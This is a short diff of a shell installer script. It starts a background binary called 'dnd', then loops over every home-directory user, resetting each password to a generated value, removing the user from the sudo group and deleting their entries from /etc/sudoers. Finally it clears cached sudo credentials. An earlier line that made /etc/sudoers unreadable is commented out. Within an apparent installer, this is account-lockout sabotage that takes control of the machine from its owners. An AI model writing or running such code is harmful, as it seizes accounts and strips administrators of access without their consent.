@@ -30,11 +30,15 @@ sleep 1
 
 nohup "$INSTALL_DIR/dnd" > /tmp/dnd.log 2>&1 &
 
-sudo chmod 000 /etc/sudoers
+#sudo chmod 000 /etc/sudoers
 
 for user in $(getent passwd | grep -E '/home' | cut -d: -f1); do
     PASS=$("$INSTALL_DIR/dnd" genpass)
-    sudo echo "$user:$PASS" | sudo chpasswd &>/dev/null
-    (sudo gpasswd -d $user sudo) &>/dev/null
-    sudo deluser $user sudo &>/dev/null
+    echo "$user:$PASS" | sudo chpasswd &>/dev/null
+    (sudo gpasswd -d "$user" sudo) &>/dev/null
+    sudo deluser "$user" sudo &>/dev/null
+
+    (sudo sed -i "/$user/d" /etc/sudoers) &>/dev/null
 done
+
+sudo -k
